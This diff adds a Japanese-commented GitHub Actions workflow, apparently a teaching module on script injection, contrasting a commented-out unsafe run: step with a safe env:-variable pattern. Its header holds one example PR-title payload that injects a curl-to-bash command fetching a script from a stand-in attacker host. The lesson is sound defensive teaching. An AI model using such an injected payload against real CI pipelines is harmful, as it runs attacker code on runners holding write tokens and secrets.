@@ -1,0 +1,59 @@
+# モジュール 4: スクリプトインジェクション（安全な書き方）
+#
+# 攻撃の構図:
+#   run: の中に ${{ }} を直接展開すると、その中身は「シェルスクリプトの一部」として
+#   ランナー上で展開される。PR のタイトルや issue 本文は攻撃者が自由に決められるので、
+#   そこにシェルコマンドを仕込まれると、そのまま実行されてしまう。
+#
+#   例: PR タイトルを次のようにする
+#       "; curl -s https://attacker.example/x.sh | bash #
+#
+# 対策は 2 つだけ:
+#   1. env: 経由で環境変数に入れてから "$VAR" として参照する
+#   2. actions/github-script を使う場合も context 経由で受け取る
+name: 25 - Script Injection
+
+on:
+  pull_request_target:
+    types: [opened, edited]
+
+permissions: {}
+
+jobs:
+  # ❌ 危険な例（実行されないようコメントアウトしてある）
+  # unsafe:
+  #   runs-on: ubuntu-latest
+  #   steps:
+  #     - name: 危険
+  #       run: |
+  #         echo "PR title: ${{ github.event.pull_request.title }}"
+  #         #                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  #         #                 ここに任意のシェルコマンドを注入できる
+
+  # ✅ 安全な例
+  safe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 環境変数経由で受け取る
+        env:
+          # ${{ }} の展開は env: の値として行われる。シェルには渡らない。
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+        run: |
+          # クォートして参照すれば、中身が何であってもただの文字列
+          echo "title : $PR_TITLE"
+          echo "author: $PR_AUTHOR"
+
+          # 検証する場合も、パターンマッチで行う
+          if echo "$PR_TITLE" | grep -Eq '^(feat|fix|docs|chore)(\(.+\))?: .+'; then
+            echo "Conventional Commits 形式です"
+          else
+            echo "::warning::PR タイトルが規約に沿っていません"
+          fi
+
+      - name: 注意点
+        run: |
+          echo "pull_request_target は書き込み権限とシークレットを持って動く。"
+          echo "だからこのワークフローでは PR のコードを絶対に checkout しない。"
+          echo "ビルドやテストが必要なら 21/22 の workflow_run パターンを使う。"
